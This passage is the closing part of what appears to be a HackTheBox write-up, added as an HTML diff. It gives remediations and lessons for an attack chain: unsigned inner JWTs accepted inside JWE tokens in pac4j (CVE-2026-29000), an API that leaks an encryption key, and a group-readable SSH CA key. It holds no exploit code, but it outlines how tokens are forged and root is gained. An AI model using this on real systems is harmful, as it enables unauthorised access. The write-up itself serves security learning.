+  <!-- ══ FIX ══ -->
+  <h2>The fix</h2>
+
+  <p>Each link in the chain has a concrete, one-line remediation — and they're independent, so defence in depth means fixing all of them, not just the CVE:</p>
+
+  <ul>
+    <li><strong>Enforce the inner signature.</strong> Configure pac4j's <code>JwtAuthenticator</code> with a required <code>SignatureConfiguration</code> and reject any inner <code>PlainJWT</code> / <code>alg:none</code>. Decryption must never stand in for signature verification — they answer different questions (confidentiality vs. authenticity). Upgrading past the CVE-2026-29000 fix in pac4j-jwt closes the accept-unsigned path.</li>
+    <li><strong>Validate the claims, not just the wrapper.</strong> Check <code>iss</code>, <code>exp</code>, and an expected audience server-side, so a forged token can't simply assert <code>ROLE_ADMIN</code> forever.</li>
+    <li><strong>Never return a secret from an API.</strong> <code>/api/settings</code> should not include <code>encryptionKey</code> — or any credential — in its response body, for <em>any</em> role. The moment a value crosses to a client, treat it as disclosed.</li>
+    <li><strong>Lock the CA key to root.</strong> A <code>TrustedUserCAKeys</code> signing key is root-equivalent; it must be <code>0400 root:root</code>, never <code>0440 root:deployers</code>. Group-readability handed the whole machine to anyone in <code>deployers</code>.</li>
+  </ul>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Lessons</h2>
+
+  <ul>
+    <li><strong>Encryption is confidentiality, not authenticity.</strong> A JWE proves the sender had a <em>public</em> key — which is public by definition. It says nothing about who issued the claims. Authenticity lives in the inner signature, and it has to be verified as its own step. Skip that step and an "encrypted" token is a token anyone can write. That is the whole of CVE-2026-29000.</li>
+    <li><strong>A published key is an attacker's key too.</strong> The JWKS endpoint exists so clients can verify tokens, but the same public key is exactly what you need to <em>encrypt</em> a forged one. Publishing a key is fine; relying on possession of a public key as if it were proof of identity is not.</li>
+    <li><strong>Secrets do not belong in an API response, even an admin-only one.</strong> Here "admin-only" was one forged claim away — but even a perfectly-authenticated admin should never be handed a live credential in cleartext. The moment a value is returned to a client, treat it as disclosed.</li>
+    <li><strong>An SSH CA private key is a root-equivalent secret.</strong> With <code>TrustedUserCAKeys</code>, the certificate is the authorization; whoever can read the CA key can mint any identity <code>sshd</code> will accept, root included. It must be at least as protected as root's own credentials — a group-readable CA key hands the group the machine.</li>
+  </ul>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
